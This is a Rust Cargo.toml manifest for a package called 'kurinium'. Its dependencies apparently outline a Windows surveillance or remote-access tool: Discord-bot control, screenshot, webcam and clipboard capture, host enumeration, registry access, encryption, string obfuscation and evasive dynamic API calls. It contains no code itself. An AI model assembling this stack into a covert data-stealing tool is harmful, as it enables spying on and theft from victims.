[package]
name = "kurinium"
version = "0.3.4"
edition = "2021"

[target.'cfg(target_os = "windows")'.dependencies]
winapi = { version = "0.3", features = [
    "winbase",
    "wincon",
    "winuser",
    "processthreadsapi",
    "handleapi",
    "winnt",
    "securitybaseapi",
    "winspool",
] }
windows-volume-control = "0.1"
windows = { version = "0.59", features = [
    "Win32_Foundation",
    "Win32_UI_WindowsAndMessaging",
    "Win32_System_Diagnostics_Debug",
    "Win32_System_ProcessStatus",
    "Win32_System_SystemInformation",
    "Win32_System_Threading",
    "Win32_Storage_FileSystem",
    "Win32_System_LibraryLoader",
    "Win32_System_Memory",
    "Win32_NetworkManagement_IpHelper",
    "Win32_Graphics_Gdi",
    "Win32_Devices_DeviceAndDriverInstallation",
    "Win32_System_Registry",
    "Win32_Security",
    "Win32_Media_MediaFoundation",
    "Win32_System_Com",
] }

[dependencies]
twilight-gateway = "0.16"
twilight-http = "0.16"
twilight-model = "0.16"
twilight-util = { version = "0.16", features = ["builder"] }
tokio = { version = "1.0", features = ["full"] }
once_cell = "1.8"
serde = { version = "1.0", features = ["derive"] }
serde_json = "1.0"
reqwest = { version = "0.12.23", features = ["json", "cookies"] }
futures = "0.3"
tracing = "0.1"
get_if_addrs = "0.5.3"
tracing-subscriber = "0.3"
async-trait = "0.1"
anyhow = "1.0"
aes-gcm = "0.10"
rand = "0.8.5"
base64 = "0.22.1"
obfstr = "0.4"
hex = "0.4"
sysinfo = "0.29.0"
screenshots = "0.5.0"
chrono = { version = "0.4", features = ["serde"] }
clipboard-win = "5.4.1"
zip = "0.6.0"
walkdir = "2.3"
gethostname = "0.4.3"
winreg = "0.55.0"
regex = "1"
uuid = { version = "1.0", features = ["v4"] }
winres = "0.1"
hf = "0.3.0"
nokhwa = { version = "0.10", features = ["input-native"] }
image = { version = "0.25", features = ["default-formats"] }
lazy_static = "1.5.0"
dinvk = "0.4.2"

[build-dependencies]
winres = "0.1"
anyhow = "1.0"

# Smaller size profile ----------
[profile.release]
opt-level = "z"
lto = true
codegen-units = 1
strip = true
panic = "abort"
overflow-checks = false
debug = false
split-debuginfo = "off"
debug-assertions = false
incremental = false
rpath = false

